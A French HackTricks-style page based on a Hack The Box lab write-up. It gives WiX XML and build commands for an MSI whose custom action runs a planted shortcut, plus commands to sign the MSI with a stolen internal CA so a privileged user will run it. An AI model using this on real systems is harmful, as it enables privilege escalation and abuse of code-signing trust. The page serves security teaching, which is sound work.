# Créer un MSI avec Custom-Action avec WiX

{{#include ../../banners/hacktricks-training.md}}

Cette chaîne historique de Hack The Box utilisait WiX Toolset v3 pour créer un MSI qui lançait un fichier `.lnk` préalablement placé. **Un MSI n'est pas automatiquement privilégié** : son exécution s'effectue dans le contexte sélectionné par la stratégie de Windows Installer, les attributs de la custom-action et la personne qui l'installe. Dans le scénario cité, l'attaquant avait également volé une trusted signing CA et placé le MSI signé dans un dossier surveillé par un autre utilisateur.<sup>[[1]](#references)[[3]](#references)</sup>

Pour bien comprendre les exemples d'utilisation de wix MSI, il est conseillé de consulter [cette page](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Vous y trouverez divers exemples illustrant l'utilisation de wix MSI.<sup>[[2]](#references)</sup>

Le MSI exécute `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. Le XML WiX v3 original est conservé ci-dessous :<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion` déclare la version minimale de Windows Installer et `Compressed="yes"` indique que le package est compressé. `Stage1` est différée, mais possède `Impersonate="yes"` ; elle s’exécute donc avec le token usurpé de l’utilisateur qui effectue l’installation. Dans ce scénario, le changement de privilèges provenait de l’utilisateur privilégié qui a ensuite ouvert le MSI, et non de cet attribut, qui n’accorde pas magiquement les privilèges SYSTEM.<sup>[[3]](#references)</sup>

Compilez la source en objet WiX avec `candle.exe` :<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
Liez cet objet dans un MSI avec `light.exe`:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### Étape de signature utilisée dans la chaîne originale

Le workflow cible acceptait les packages signés par une CA interne compromise. Le write-up a dérivé un certificat de signature à partir de `MyCA.cer`/`MyCA.pvk`, créé un PFX et signé le MSI :<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
L’attaquant a ensuite placé le package signé dans `D:\DEV\MSIs` et a attendu que le workflow/l’utilisateur privilégié l’exécute. Préservez cette condition préalable lors de l’adaptation de la technique : sans chemin d’installation avec élévation, stratégie non sécurisée telle que `AlwaysInstallElevated`, ou victime privilégiée, ce package s’exécute uniquement avec les droits de l’utilisateur actuel.

## References

- [1] [Hack The Box - Ethereal : Création d’un msi malveillant et obtention des privilèges root - Blog de 0xRick](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [Une brève introduction : créer un programme d’installation MSI avec WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Actions personnalisées à exécution différée (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
